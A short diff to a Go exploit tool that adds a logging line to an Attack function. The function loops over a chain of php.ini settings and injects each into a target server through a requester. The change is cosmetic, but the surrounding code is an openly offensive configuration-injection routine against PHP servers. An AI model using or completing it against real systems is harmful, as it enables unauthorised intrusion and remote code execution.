@@ -1,5 +1,7 @@
 package main
 
+import "log"
+
 var chain = []string{
 	"short_open_tag=1",
 	"html_errors=0",
@@ -13,6 +15,7 @@ var chain = []string{
 }
 
 func Attack(requester *Requester, params *AttackParams) error {
+	log.Printf("Performing attack using php.ini settings...")
 	for {
 		for _, payload := range chain {
 			if err := SetSetting(requester, params, payload, 1); err != nil {
